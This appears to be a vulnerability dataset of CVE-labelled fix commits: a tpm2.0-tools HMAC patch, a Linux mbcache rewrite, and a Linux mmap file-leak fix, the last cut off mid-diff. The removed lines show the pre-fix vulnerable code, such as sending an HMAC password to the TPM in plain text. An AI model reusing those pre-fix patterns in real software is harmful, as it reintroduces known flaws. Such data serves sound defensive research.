{"CVE_ID": "CVE-2017-7524", "CWE_ID": "200", "category": "security", "commit_id": "c5d72beaab1cbbbe68271f4bc4b6670d69985157", "commit_message": "From c5d72beaab1cbbbe68271f4bc4b6670d69985157 Mon Sep 17 00:00:00 2001\nFrom: William Roberts <william.c.roberts@intel.com>\nDate: Wed, 21 Jun 2017 09:32:32 -0700\nSubject: [PATCH] kdfa: use openssl for hmac not tpm\n\nWhile not reachable in the current code base tools, a potential\nsecurity bug lurked in tpm_kdfa().\n\nIf using that routine for an hmac authorization, the hmac was\ncalculated using the tpm. A user of an object wishing to\nauthenticate via hmac, would expect that the password is never\nsent to the tpm. However, since the hmac calculation relies on\npassword, and is performed by the tpm, the password ends up\nbeing sent in plain text to the tpm.\n\nThe fix is to use openssl to generate the hmac on the host.\n\nFixes: CVE-2017-7524\n\nSigned-off-by: William Roberts <william.c.roberts@intel.com>\n---\n Makefile.am       |  4 +--\n configure.ac      |  3 +-\n lib/tpm_kdfa.c    | 76 ++++++++++++++++++++++++++++++++++++++++-------\n lib/tpm_kdfa.h    |  2 +-\n lib/tpm_session.c |  2 +-\n 5 files changed, 72 insertions(+), 15 deletions(-)\n\n", "diff_code": "diff --git a/Makefile.am b/Makefile.am\nindex a3c43f874..c40c24bd3 100644\n--- a/Makefile.am\n+++ b/Makefile.am\n@@ -35,10 +35,10 @@ ACLOCAL_AMFLAGS = -I m4\n INCLUDE_DIRS = -I$(srcdir)/src -I$(srcdir)/lib\n LIB_COMMON := lib/libcommon.a\n \n-AM_CFLAGS    := $(INCLUDE_DIRS) $(TPM20_TSS_CFLAGS) $(EXTRA_CFLAGS) $(TCTI_TABRMD_CFLAGS)\n+AM_CFLAGS    := $(INCLUDE_DIRS) $(TPM20_TSS_CFLAGS) $(EXTRA_CFLAGS) $(TCTI_TABRMD_CFLAGS) $(CRYPTO_CFLAGS)\n AM_LDFLAGS   := $(EXTRA_LDFLAGS)\n \n-LDADD = $(LIB_COMMON) $(TPM20_TSS_LIBS) $(TCTI_SOCK_LIBS) $(TCTI_DEV_LIBS) $(TCTI_TABRMD_LIBS)\n+LDADD = $(LIB_COMMON) $(TPM20_TSS_LIBS) $(TCTI_SOCK_LIBS) $(TCTI_DEV_LIBS) $(TCTI_TABRMD_LIBS) $(CRYPTO_LIBS)\n \n sbin_PROGRAMS = \\\n     tools/tpm2_create \\\ndiff --git a/configure.ac b/configure.ac\nindex ce781ea9f..8ef3b173b 100644\n--- a/configure.ac\n+++ b/configure.ac\n@@ -69,7 +69,8 @@ AS_IF(\n     [AC_MSG_ERROR(\n         [no TCTIs: at least one TCTI library must be enabled],\n         [1])])\n-PKG_CHECK_MODULES([CURL],[libcurl libcrypto])\n+PKG_CHECK_MODULES([CRYPTO],[libcrypto])\n+PKG_CHECK_MODULES([CURL],[libcurl])\n AC_ARG_ENABLE([unit],\n             [AS_HELP_STRING([--enable-unit],\n                             [build cmocka unit tests (default is no)])],\ndiff --git a/lib/tpm_kdfa.c b/lib/tpm_kdfa.c\nindex 0ba8679e1..8198c9bbf 100644\n--- a/lib/tpm_kdfa.c\n+++ b/lib/tpm_kdfa.c\n@@ -27,20 +27,40 @@\n \n #include <sapi/tpm20.h>\n \n+ #include <openssl/err.h>\n+#include <openssl/hmac.h>\n+\n #include \"string-bytes.h\"\n #include \"tpm_hmac.h\"\n+#include \"log.h\"\n+\n+static const EVP_MD *tpm_algorithm_to_openssl_digest(TPMI_ALG_HASH algorithm) {\n+\n+    switch(algorithm) {\n+    case TPM_ALG_SHA1:\n+        return EVP_sha1();\n+    case ALG_SHA256_VALUE:\n+        return EVP_sha256();\n+    case TPM_ALG_SHA384:\n+        return EVP_sha384();\n+    case TPM_ALG_SHA512:\n+        return EVP_sha512();\n+    default:\n+        return NULL;\n+    }\n+    /* no return, not possible */\n+}\n \n-TPM_RC tpm_kdfa(TSS2_SYS_CONTEXT *sapi_context, TPMI_ALG_HASH hashAlg,\n+TPM_RC tpm_kdfa(TPMI_ALG_HASH hashAlg,\n         TPM2B *key, char *label, TPM2B *contextU, TPM2B *contextV, UINT16 bits,\n         TPM2B_MAX_BUFFER  *resultKey )\n {\n-    TPM2B_DIGEST tmpResult;\n     TPM2B_DIGEST tpm2bLabel, tpm2bBits, tpm2b_i_2;\n     UINT8 *tpm2bBitsPtr = &tpm2bBits.t.buffer[0];\n     UINT8 *tpm2b_i_2Ptr = &tpm2b_i_2.t.buffer[0];\n     TPM2B_DIGEST *bufferList[8];\n     UINT32 bitsSwizzled, i_Swizzled;\n-    TPM_RC rval;\n+    TPM_RC rval = TPM_RC_SUCCESS;\n     int i, j;\n     UINT16 bytes = bits / 8;\n \n@@ -64,8 +84,24 @@ TPM_RC tpm_kdfa(TSS2_SYS_CONTEXT *sapi_context, TPMI_ALG_HASH hashAlg,\n \n     i = 1;\n \n+    const EVP_MD *md = tpm_algorithm_to_openssl_digest(hashAlg);\n+    if (!md) {\n+        LOG_ERR(\"Algorithm not supported for hmac: %x\", hashAlg);\n+        return TPM_RC_HASH;\n+    }\n+\n+    HMAC_CTX ctx;\n+    HMAC_CTX_init(&ctx);\n+    int rc = HMAC_Init_ex(&ctx, key->buffer, key->size, md, NULL);\n+    if (!rc) {\n+        LOG_ERR(\"HMAC Init failed: %s\", ERR_error_string(rc, NULL));\n+        return TPM_RC_MEMORY;\n+    }\n+\n+    // TODO Why is this a loop? It appears to only execute once.\n     while( resultKey->t.size < bytes )\n     {\n+        TPM2B_DIGEST tmpResult;\n         // Inner loop\n \n         i_Swizzled = string_bytes_endian_convert_32( i );\n@@ -77,21 +113,41 @@ TPM_RC tpm_kdfa(TSS2_SYS_CONTEXT *sapi_context, TPMI_ALG_HASH hashAlg,\n         bufferList[j++] = (TPM2B_DIGEST *)contextU;\n         bufferList[j++] = (TPM2B_DIGEST *)contextV;\n         bufferList[j++] = (TPM2B_DIGEST *)&(tpm2bBits.b);\n-        bufferList[j++] = (TPM2B_DIGEST *)0;\n-        rval = tpm_hmac(sapi_context, hashAlg, key, (TPM2B **)&( bufferList[0] ), &tmpResult );\n-        if( rval != TPM_RC_SUCCESS )\n-        {\n-            return( rval );\n+        bufferList[j] = (TPM2B_DIGEST *)0;\n+\n+        int c;\n+        for(c=0; c < j; c++) {\n+            TPM2B_DIGEST *digest = bufferList[c];\n+            int rc =  HMAC_Update(&ctx, digest->b.buffer, digest->b.size);\n+            if (!rc) {\n+                LOG_ERR(\"HMAC Update failed: %s\", ERR_error_string(rc, NULL));\n+                rval = TPM_RC_MEMORY;\n+                goto err;\n+            }\n+        }\n+\n+        unsigned size = sizeof(tmpResult.t.buffer);\n+        int rc = HMAC_Final(&ctx, tmpResult.t.buffer, &size);\n+        if (!rc) {\n+            LOG_ERR(\"HMAC Final failed: %s\", ERR_error_string(rc, NULL));\n+            rval = TPM_RC_MEMORY;\n+            goto err;\n         }\n \n+        tmpResult.t.size = size;\n+\n         bool res = string_bytes_concat_buffer(resultKey, &(tmpResult.b));\n         if (!res) {\n-            return TSS2_SYS_RC_BAD_VALUE;\n+            rval = TSS2_SYS_RC_BAD_VALUE;\n+            goto err;\n         }\n     }\n \n     // Truncate the result to the desired size.\n     resultKey->t.size = bytes;\n \n-    return TPM_RC_SUCCESS;\n+err:\n+    HMAC_CTX_cleanup(&ctx);\n+\n+    return rval;\n }\ndiff --git a/lib/tpm_kdfa.h b/lib/tpm_kdfa.h\nindex 68413bd88..e26b111ca 100644\n--- a/lib/tpm_kdfa.h\n+++ b/lib/tpm_kdfa.h\n@@ -42,7 +42,7 @@\n  * @param resultKey\n  * @return\n  */\n-TPM_RC tpm_kdfa(TSS2_SYS_CONTEXT *sapi_context, TPMI_ALG_HASH hashAlg,\n+TPM_RC tpm_kdfa(TPMI_ALG_HASH hashAlg,\n         TPM2B *key, char *label, TPM2B *contextU, TPM2B *contextV,\n         UINT16 bits, TPM2B_MAX_BUFFER *resultKey );\n \ndiff --git a/lib/tpm_session.c b/lib/tpm_session.c\nindex 414f1f74a..f13e7efcc 100644\n--- a/lib/tpm_session.c\n+++ b/lib/tpm_session.c\n@@ -198,7 +198,7 @@ static TPM_RC StartAuthSession(TSS2_SYS_CONTEXT *sapi_context, SESSION *session\n             }\n             else\n             {\n-                rval = tpm_kdfa(sapi_context, session->authHash, &(key.b), label, &( session->nonceNewer.b ),\n+                rval = tpm_kdfa(session->authHash, &(key.b), label, &( session->nonceNewer.b ),\n                         &( session->nonceOlder.b ), bytes * 8, (TPM2B_MAX_BUFFER *)&( session->sessionKey ) );\n             }\n \n", "owner": "01org", "repo": "tpm2.0-tools", "source": "cve"}
{"CVE_ID": "CVE-2015-8952", "CWE_ID": "19", "category": "security", "commit_id": "f9a61eb4e2471c56a63cd804c7474128138c38ac", "commit_message": "From f9a61eb4e2471c56a63cd804c7474128138c38ac Mon Sep 17 00:00:00 2001\nFrom: Jan Kara <jack@suse.cz>\nDate: Mon, 22 Feb 2016 11:49:09 -0500\nSubject: mbcache2: reimplement mbcache\n\nOriginal mbcache was designed to have more features than what ext?\nfilesystems ended up using. It supported entry being in more hashes, it\nhad a home-grown rwlocking of each entry, and one cache could cache\nentries from multiple filesystems. This genericity also resulted in more\ncomplex locking, larger cache entries, and generally more code\ncomplexity.\n\nThis is reimplementation of the mbcache functionality to exactly fit the\npurpose ext? filesystems use it for. Cache entries are now considerably\nsmaller (7 instead of 13 longs), the code is considerably smaller as\nwell (414 vs 913 lines of code), and IMO also simpler. The new code is\nalso much more lightweight.\n\nI have measured the speed using artificial xattr-bench benchmark, which\nspawns P processes, each process sets xattr for F different files, and\nthe value of xattr is randomly chosen from a pool of V values. Averages\nof runtimes for 5 runs for various combinations of parameters are below.\nThe first value in each cell is old mbache, the second value is the new\nmbcache.\n\nV=10\nF\\P\t1\t\t2\t\t4\t\t8\t\t16\t\t32\t\t64\n10\t0.158,0.157\t0.208,0.196\t0.500,0.277\t0.798,0.400\t3.258,0.584\t13.807,1.047\t61.339,2.803\n100\t0.172,0.167\t0.279,0.222\t0.520,0.275\t0.825,0.341\t2.981,0.505\t12.022,1.202\t44.641,2.943\n1000\t0.185,0.174\t0.297,0.239\t0.445,0.283\t0.767,0.340\t2.329,0.480\t6.342,1.198\t16.440,3.888\n\nV=100\nF\\P\t1\t\t2\t\t4\t\t8\t\t16\t\t32\t\t64\n10\t0.162,0.153\t0.200,0.186\t0.362,0.257\t0.671,0.496\t1.433,0.943\t3.801,1.345\t7.938,2.501\n100\t0.153,0.160\t0.221,0.199\t0.404,0.264\t0.945,0.379\t1.556,0.485\t3.761,1.156\t7.901,2.484\n1000\t0.215,0.191\t0.303,0.246\t0.471,0.288\t0.960,0.347\t1.647,0.479\t3.916,1.176\t8.058,3.160\n\nV=1000\nF\\P\t1\t\t2\t\t4\t\t8\t\t16\t\t32\t\t64\n10\t0.151,0.129\t0.210,0.163\t0.326,0.245\t0.685,0.521\t1.284,0.859\t3.087,2.251\t6.451,4.801\n100\t0.154,0.153\t0.211,0.191\t0.276,0.282\t0.687,0.506\t1.202,0.877\t3.259,1.954\t8.738,2.887\n1000\t0.145,0.179\t0.202,0.222\t0.449,0.319\t0.899,0.333\t1.577,0.524\t4.221,1.240\t9.782,3.579\n\nV=10000\nF\\P\t1\t\t2\t\t4\t\t8\t\t16\t\t32\t\t64\n10\t0.161,0.154\t0.198,0.190\t0.296,0.256\t0.662,0.480\t1.192,0.818\t2.989,2.200\t6.362,4.746\n100\t0.176,0.174\t0.236,0.203\t0.326,0.255\t0.696,0.511\t1.183,0.855\t4.205,3.444\t19.510,17.760\n1000\t0.199,0.183\t0.240,0.227\t1.159,1.014\t2.286,2.154\t6.023,6.039\t---,10.933\t---,36.620\n\nV=100000\nF\\P\t1\t\t2\t\t4\t\t8\t\t16\t\t32\t\t64\n10\t0.171,0.162\t0.204,0.198\t0.285,0.230\t0.692,0.500\t1.225,0.881\t2.990,2.243\t6.379,4.771\n100\t0.151,0.171\t0.220,0.210\t0.295,0.255\t0.720,0.518\t1.226,0.844\t3.423,2.831\t19.234,17.544\n1000\t0.192,0.189\t0.249,0.225\t1.162,1.043\t2.257,2.093\t5.853,4.997\t---,10.399\t---,32.198\n\nWe see that the new code is faster in pretty much all the cases and\nstarting from 4 processes there are significant gains with the new code\nresulting in upto 20-times shorter runtimes. Also for large numbers of\ncached entries all values for the old code could not be measured as the\nkernel started hitting softlockups and died before the test completed.\n\nSigned-off-by: Jan Kara <jack@suse.cz>\nSigned-off-by: Theodore Ts'o <tytso@mit.edu>\n---\n fs/Makefile              |   2 +-\n fs/mbcache2.c            | 359 +++++++++++++++++++++++++++++++++++++++++++++++\n include/linux/mbcache2.h |  50 +++++++\n 3 files changed, 410 insertions(+), 1 deletion(-)\n create mode 100644 fs/mbcache2.c\n create mode 100644 include/linux/mbcache2.h\n\n", "diff_code": "diff --git a/fs/Makefile b/fs/Makefile\nindex 79f522575cba..15b3d6c4e46a 100644\n--- a/fs/Makefile\n+++ b/fs/Makefile\n@@ -41,7 +41,7 @@ obj-$(CONFIG_COMPAT_BINFMT_ELF)\t+= compat_binfmt_elf.o\n obj-$(CONFIG_BINFMT_ELF_FDPIC)\t+= binfmt_elf_fdpic.o\n obj-$(CONFIG_BINFMT_FLAT)\t+= binfmt_flat.o\n \n-obj-$(CONFIG_FS_MBCACHE)\t+= mbcache.o\n+obj-$(CONFIG_FS_MBCACHE)\t+= mbcache.o mbcache2.o\n obj-$(CONFIG_FS_POSIX_ACL)\t+= posix_acl.o\n obj-$(CONFIG_NFS_COMMON)\t+= nfs_common/\n obj-$(CONFIG_COREDUMP)\t\t+= coredump.o\ndiff --git a/fs/mbcache2.c b/fs/mbcache2.c\nnew file mode 100644\nindex 000000000000..5c3e1a8c38f6\n--- /dev/null\n+++ b/fs/mbcache2.c\n@@ -0,0 +1,359 @@\n+#include <linux/spinlock.h>\n+#include <linux/slab.h>\n+#include <linux/list.h>\n+#include <linux/list_bl.h>\n+#include <linux/module.h>\n+#include <linux/sched.h>\n+#include <linux/mbcache2.h>\n+\n+/*\n+ * Mbcache is a simple key-value store. Keys need not be unique, however\n+ * key-value pairs are expected to be unique (we use this fact in\n+ * mb2_cache_entry_delete_block()).\n+ *\n+ * Ext2 and ext4 use this cache for deduplication of extended attribute blocks.\n+ * They use hash of a block contents as a key and block number as a value.\n+ * That's why keys need not be unique (different xattr blocks may end up having\n+ * the same hash). However block number always uniquely identifies a cache\n+ * entry.\n+ *\n+ * We provide functions for creation and removal of entries, search by key,\n+ * and a special \"delete entry with given key-value pair\" operation. Fixed\n+ * size hash table is used for fast key lookups.\n+ */\n+\n+struct mb2_cache {\n+\t/* Hash table of entries */\n+\tstruct hlist_bl_head\t*c_hash;\n+\t/* log2 of hash table size */\n+\tint\t\t\tc_bucket_bits;\n+\t/* Protects c_lru_list, c_entry_count */\n+\tspinlock_t\t\tc_lru_list_lock;\n+\tstruct list_head\tc_lru_list;\n+\t/* Number of entries in cache */\n+\tunsigned long\t\tc_entry_count;\n+\tstruct shrinker\t\tc_shrink;\n+};\n+\n+static struct kmem_cache *mb2_entry_cache;\n+\n+/*\n+ * mb2_cache_entry_create - create entry in cache\n+ * @cache - cache where the entry should be created\n+ * @mask - gfp mask with which the entry should be allocated\n+ * @key - key of the entry\n+ * @block - block that contains data\n+ *\n+ * Creates entry in @cache with key @key and records that data is stored in\n+ * block @block. The function returns -EBUSY if entry with the same key\n+ * and for the same block already exists in cache. Otherwise 0 is returned.\n+ */\n+int mb2_cache_entry_create(struct mb2_cache *cache, gfp_t mask, u32 key,\n+\t\t\t   sector_t block)\n+{\n+\tstruct mb2_cache_entry *entry, *dup;\n+\tstruct hlist_bl_node *dup_node;\n+\tstruct hlist_bl_head *head;\n+\n+\tentry = kmem_cache_alloc(mb2_entry_cache, mask);\n+\tif (!entry)\n+\t\treturn -ENOMEM;\n+\n+\tINIT_LIST_HEAD(&entry->e_lru_list);\n+\t/* One ref for hash, one ref returned */\n+\tatomic_set(&entry->e_refcnt, 1);\n+\tentry->e_key = key;\n+\tentry->e_block = block;\n+\thead = &cache->c_hash[hash_32(key, cache->c_bucket_bits)];\n+\tentry->e_hash_list_head = head;\n+\thlist_bl_lock(head);\n+\thlist_bl_for_each_entry(dup, dup_node, head, e_hash_list) {\n+\t\tif (dup->e_key == key && dup->e_block == block) {\n+\t\t\thlist_bl_unlock(head);\n+\t\t\tkmem_cache_free(mb2_entry_cache, entry);\n+\t\t\treturn -EBUSY;\n+\t\t}\n+\t}\n+\thlist_bl_add_head(&entry->e_hash_list, head);\n+\thlist_bl_unlock(head);\n+\n+\tspin_lock(&cache->c_lru_list_lock);\n+\tlist_add_tail(&entry->e_lru_list, &cache->c_lru_list);\n+\t/* Grab ref for LRU list */\n+\tatomic_inc(&entry->e_refcnt);\n+\tcache->c_entry_count++;\n+\tspin_unlock(&cache->c_lru_list_lock);\n+\n+\treturn 0;\n+}\n+EXPORT_SYMBOL(mb2_cache_entry_create);\n+\n+void __mb2_cache_entry_free(struct mb2_cache_entry *entry)\n+{\n+\tkmem_cache_free(mb2_entry_cache, entry);\n+}\n+EXPORT_SYMBOL(__mb2_cache_entry_free);\n+\n+static struct mb2_cache_entry *__entry_find(struct mb2_cache *cache,\n+\t\t\t\t\t    struct mb2_cache_entry *entry,\n+\t\t\t\t\t    u32 key)\n+{\n+\tstruct mb2_cache_entry *old_entry = entry;\n+\tstruct hlist_bl_node *node;\n+\tstruct hlist_bl_head *head;\n+\n+\tif (entry)\n+\t\thead = entry->e_hash_list_head;\n+\telse\n+\t\thead = &cache->c_hash[hash_32(key, cache->c_bucket_bits)];\n+\thlist_bl_lock(head);\n+\tif (entry && !hlist_bl_unhashed(&entry->e_hash_list))\n+\t\tnode = entry->e_hash_list.next;\n+\telse\n+\t\tnode = hlist_bl_first(head);\n+\twhile (node) {\n+\t\tentry = hlist_bl_entry(node, struct mb2_cache_entry,\n+\t\t\t\t       e_hash_list);\n+\t\tif (entry->e_key == key) {\n+\t\t\tatomic_inc(&entry->e_refcnt);\n+\t\t\tgoto out;\n+\t\t}\n+\t\tnode = node->next;\n+\t}\n+\tentry = NULL;\n+out:\n+\thlist_bl_unlock(head);\n+\tif (old_entry)\n+\t\tmb2_cache_entry_put(cache, old_entry);\n+\n+\treturn entry;\n+}\n+\n+/*\n+ * mb2_cache_entry_find_first - find the first entry in cache with given key\n+ * @cache: cache where we should search\n+ * @key: key to look for\n+ *\n+ * Search in @cache for entry with key @key. Grabs reference to the first\n+ * entry found and returns the entry.\n+ */\n+struct mb2_cache_entry *mb2_cache_entry_find_first(struct mb2_cache *cache,\n+\t\t\t\t\t\t   u32 key)\n+{\n+\treturn __entry_find(cache, NULL, key);\n+}\n+EXPORT_SYMBOL(mb2_cache_entry_find_first);\n+\n+/*\n+ * mb2_cache_entry_find_next - find next entry in cache with the same\n+ * @cache: cache where we should search\n+ * @entry: entry to start search from\n+ *\n+ * Finds next entry in the hash chain which has the same key as @entry.\n+ * If @entry is unhashed (which can happen when deletion of entry races\n+ * with the search), finds the first entry in the hash chain. The function\n+ * drops reference to @entry and returns with a reference to the found entry.\n+ */\n+struct mb2_cache_entry *mb2_cache_entry_find_next(struct mb2_cache *cache,\n+\t\t\t\t\t\t  struct mb2_cache_entry *entry)\n+{\n+\treturn __entry_find(cache, entry, entry->e_key);\n+}\n+EXPORT_SYMBOL(mb2_cache_entry_find_next);\n+\n+/* mb2_cache_entry_delete_block - remove information about block from cache\n+ * @cache - cache we work with\n+ * @key - key of the entry to remove\n+ * @block - block containing data for @key\n+ *\n+ * Remove entry from cache @cache with key @key with data stored in @block.\n+ */\n+void mb2_cache_entry_delete_block(struct mb2_cache *cache, u32 key,\n+\t\t\t\t  sector_t block)\n+{\n+\tstruct hlist_bl_node *node;\n+\tstruct hlist_bl_head *head;\n+\tstruct mb2_cache_entry *entry;\n+\n+\thead = &cache->c_hash[hash_32(key, cache->c_bucket_bits)];\n+\thlist_bl_lock(head);\n+\thlist_bl_for_each_entry(entry, node, head, e_hash_list) {\n+\t\tif (entry->e_key == key && entry->e_block == block) {\n+\t\t\t/* We keep hash list reference to keep entry alive */\n+\t\t\thlist_bl_del_init(&entry->e_hash_list);\n+\t\t\thlist_bl_unlock(head);\n+\t\t\tspin_lock(&cache->c_lru_list_lock);\n+\t\t\tif (!list_empty(&entry->e_lru_list)) {\n+\t\t\t\tlist_del_init(&entry->e_lru_list);\n+\t\t\t\tcache->c_entry_count--;\n+\t\t\t\tatomic_dec(&entry->e_refcnt);\n+\t\t\t}\n+\t\t\tspin_unlock(&cache->c_lru_list_lock);\n+\t\t\tmb2_cache_entry_put(cache, entry);\n+\t\t\treturn;\n+\t\t}\n+\t}\n+\thlist_bl_unlock(head);\n+}\n+EXPORT_SYMBOL(mb2_cache_entry_delete_block);\n+\n+/* mb2_cache_entry_touch - cache entry got used\n+ * @cache - cache the entry belongs to\n+ * @entry - entry that got used\n+ *\n+ * Move entry in lru list to reflect the fact that it was used.\n+ */\n+void mb2_cache_entry_touch(struct mb2_cache *cache,\n+\t\t\t   struct mb2_cache_entry *entry)\n+{\n+\tspin_lock(&cache->c_lru_list_lock);\n+\tif (!list_empty(&entry->e_lru_list))\n+\t\tlist_move_tail(&cache->c_lru_list, &entry->e_lru_list);\n+\tspin_unlock(&cache->c_lru_list_lock);\n+}\n+EXPORT_SYMBOL(mb2_cache_entry_touch);\n+\n+static unsigned long mb2_cache_count(struct shrinker *shrink,\n+\t\t\t\t     struct shrink_control *sc)\n+{\n+\tstruct mb2_cache *cache = container_of(shrink, struct mb2_cache,\n+\t\t\t\t\t       c_shrink);\n+\n+\treturn cache->c_entry_count;\n+}\n+\n+/* Shrink number of entries in cache */\n+static unsigned long mb2_cache_scan(struct shrinker *shrink,\n+\t\t\t\t    struct shrink_control *sc)\n+{\n+\tint nr_to_scan = sc->nr_to_scan;\n+\tstruct mb2_cache *cache = container_of(shrink, struct mb2_cache,\n+\t\t\t\t\t      c_shrink);\n+\tstruct mb2_cache_entry *entry;\n+\tstruct hlist_bl_head *head;\n+\tunsigned int shrunk = 0;\n+\n+\tspin_lock(&cache->c_lru_list_lock);\n+\twhile (nr_to_scan-- && !list_empty(&cache->c_lru_list)) {\n+\t\tentry = list_first_entry(&cache->c_lru_list,\n+\t\t\t\t\t struct mb2_cache_entry, e_lru_list);\n+\t\tlist_del_init(&entry->e_lru_list);\n+\t\tcache->c_entry_count--;\n+\t\t/*\n+\t\t * We keep LRU list reference so that entry doesn't go away\n+\t\t * from under us.\n+\t\t */\n+\t\tspin_unlock(&cache->c_lru_list_lock);\n+\t\thead = entry->e_hash_list_head;\n+\t\thlist_bl_lock(head);\n+\t\tif (!hlist_bl_unhashed(&entry->e_hash_list)) {\n+\t\t\thlist_bl_del_init(&entry->e_hash_list);\n+\t\t\tatomic_dec(&entry->e_refcnt);\n+\t\t}\n+\t\thlist_bl_unlock(head);\n+\t\tif (mb2_cache_entry_put(cache, entry))\n+\t\t\tshrunk++;\n+\t\tcond_resched();\n+\t\tspin_lock(&cache->c_lru_list_lock);\n+\t}\n+\tspin_unlock(&cache->c_lru_list_lock);\n+\n+\treturn shrunk;\n+}\n+\n+/*\n+ * mb2_cache_create - create cache\n+ * @bucket_bits: log2 of the hash table size\n+ *\n+ * Create cache for keys with 2^bucket_bits hash entries.\n+ */\n+struct mb2_cache *mb2_cache_create(int bucket_bits)\n+{\n+\tstruct mb2_cache *cache;\n+\tint bucket_count = 1 << bucket_bits;\n+\tint i;\n+\n+\tif (!try_module_get(THIS_MODULE))\n+\t\treturn NULL;\n+\n+\tcache = kzalloc(sizeof(struct mb2_cache), GFP_KERNEL);\n+\tif (!cache)\n+\t\tgoto err_out;\n+\tcache->c_bucket_bits = bucket_bits;\n+\tINIT_LIST_HEAD(&cache->c_lru_list);\n+\tspin_lock_init(&cache->c_lru_list_lock);\n+\tcache->c_hash = kmalloc(bucket_count * sizeof(struct hlist_bl_head),\n+\t\t\t\tGFP_KERNEL);\n+\tif (!cache->c_hash) {\n+\t\tkfree(cache);\n+\t\tgoto err_out;\n+\t}\n+\tfor (i = 0; i < bucket_count; i++)\n+\t\tINIT_HLIST_BL_HEAD(&cache->c_hash[i]);\n+\n+\tcache->c_shrink.count_objects = mb2_cache_count;\n+\tcache->c_shrink.scan_objects = mb2_cache_scan;\n+\tcache->c_shrink.seeks = DEFAULT_SEEKS;\n+\tregister_shrinker(&cache->c_shrink);\n+\n+\treturn cache;\n+\n+err_out:\n+\tmodule_put(THIS_MODULE);\n+\treturn NULL;\n+}\n+EXPORT_SYMBOL(mb2_cache_create);\n+\n+/*\n+ * mb2_cache_destroy - destroy cache\n+ * @cache: the cache to destroy\n+ *\n+ * Free all entries in cache and cache itself. Caller must make sure nobody\n+ * (except shrinker) can reach @cache when calling this.\n+ */\n+void mb2_cache_destroy(struct mb2_cache *cache)\n+{\n+\tstruct mb2_cache_entry *entry, *next;\n+\n+\tunregister_shrinker(&cache->c_shrink);\n+\n+\t/*\n+\t * We don't bother with any locking. Cache must not be used at this\n+\t * point.\n+\t */\n+\tlist_for_each_entry_safe(entry, next, &cache->c_lru_list, e_lru_list) {\n+\t\tif (!hlist_bl_unhashed(&entry->e_hash_list)) {\n+\t\t\thlist_bl_del_init(&entry->e_hash_list);\n+\t\t\tatomic_dec(&entry->e_refcnt);\n+\t\t} else\n+\t\t\tWARN_ON(1);\n+\t\tlist_del(&entry->e_lru_list);\n+\t\tWARN_ON(atomic_read(&entry->e_refcnt) != 1);\n+\t\tmb2_cache_entry_put(cache, entry);\n+\t}\n+\tkfree(cache->c_hash);\n+\tkfree(cache);\n+\tmodule_put(THIS_MODULE);\n+}\n+EXPORT_SYMBOL(mb2_cache_destroy);\n+\n+static int __init mb2cache_init(void)\n+{\n+\tmb2_entry_cache = kmem_cache_create(\"mbcache\",\n+\t\t\t\tsizeof(struct mb2_cache_entry), 0,\n+\t\t\t\tSLAB_RECLAIM_ACCOUNT|SLAB_MEM_SPREAD, NULL);\n+\tBUG_ON(!mb2_entry_cache);\n+\treturn 0;\n+}\n+\n+static void __exit mb2cache_exit(void)\n+{\n+\tkmem_cache_destroy(mb2_entry_cache);\n+}\n+\n+module_init(mb2cache_init)\n+module_exit(mb2cache_exit)\n+\n+MODULE_AUTHOR(\"Jan Kara <jack@suse.cz>\");\n+MODULE_DESCRIPTION(\"Meta block cache (for extended attributes)\");\n+MODULE_LICENSE(\"GPL\");\ndiff --git a/include/linux/mbcache2.h b/include/linux/mbcache2.h\nnew file mode 100644\nindex 000000000000..b6f160ff2533\n--- /dev/null\n+++ b/include/linux/mbcache2.h\n@@ -0,0 +1,50 @@\n+#ifndef _LINUX_MB2CACHE_H\n+#define _LINUX_MB2CACHE_H\n+\n+#include <linux/hash.h>\n+#include <linux/list_bl.h>\n+#include <linux/list.h>\n+#include <linux/atomic.h>\n+#include <linux/fs.h>\n+\n+struct mb2_cache;\n+\n+struct mb2_cache_entry {\n+\t/* LRU list - protected by cache->c_lru_list_lock */\n+\tstruct list_head\te_lru_list;\n+\t/* Hash table list - protected by bitlock in e_hash_list_head */\n+\tstruct hlist_bl_node\te_hash_list;\n+\tatomic_t\t\te_refcnt;\n+\t/* Key in hash - stable during lifetime of the entry */\n+\tu32\t\t\te_key;\n+\t/* Block number of hashed block - stable during lifetime of the entry */\n+\tsector_t\t\te_block;\n+\t/* Head of hash list (for list bit lock) - stable */\n+\tstruct hlist_bl_head\t*e_hash_list_head;\n+};\n+\n+struct mb2_cache *mb2_cache_create(int bucket_bits);\n+void mb2_cache_destroy(struct mb2_cache *cache);\n+\n+int mb2_cache_entry_create(struct mb2_cache *cache, gfp_t mask, u32 key,\n+\t\t\t   sector_t block);\n+void __mb2_cache_entry_free(struct mb2_cache_entry *entry);\n+static inline int mb2_cache_entry_put(struct mb2_cache *cache,\n+\t\t\t\t      struct mb2_cache_entry *entry)\n+{\n+\tif (!atomic_dec_and_test(&entry->e_refcnt))\n+\t\treturn 0;\n+\t__mb2_cache_entry_free(entry);\n+\treturn 1;\n+}\n+\n+void mb2_cache_entry_delete_block(struct mb2_cache *cache, u32 key,\n+\t\t\t\t  sector_t block);\n+struct mb2_cache_entry *mb2_cache_entry_find_first(struct mb2_cache *cache,\n+\t\t\t\t\t\t   u32 key);\n+struct mb2_cache_entry *mb2_cache_entry_find_next(struct mb2_cache *cache,\n+\t\t\t\t\t\t  struct mb2_cache_entry *entry);\n+void mb2_cache_entry_touch(struct mb2_cache *cache,\n+\t\t\t   struct mb2_cache_entry *entry);\n+\n+#endif\t/* _LINUX_MB2CACHE_H */\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2010-0291", "CWE_ID": "264", "category": "security", "commit_id": "8c7b49b3ecd48923eb64ff57e07a1cdb74782970", "commit_message": "From 8c7b49b3ecd48923eb64ff57e07a1cdb74782970 Mon Sep 17 00:00:00 2001\nFrom: Al Viro <viro@zeniv.linux.org.uk>\nDate: Mon, 30 Nov 2009 20:12:03 -0500\nSubject: fix a struct file leak in do_mmap_pgoff()\n\nSigned-off-by: Al Viro <viro@zeniv.linux.org.uk>\n---\n mm/mmap.c | 18 ------------------\n mm/util.c | 15 +++++++++++++++\n 2 files changed, 15 insertions(+), 18 deletions(-)\n\n", "diff_code": "diff --git a/mm/mmap.c b/mm/mmap.c\nindex 292ddc3cef9c..5076775a395c 100644\n--- a/mm/mmap.c\n+++ b/mm/mmap.c\n@@ -948,24 +948,6 @@ unsigned long do_mmap_pgoff(struct file *file, unsigned long addr,\n \tif (mm->map_count > sysctl_max_map_count)\n \t\treturn -ENOMEM;\n \n-\tif (flags & MAP_HUGETLB) {\n-\t\tstruct user_struct *user = 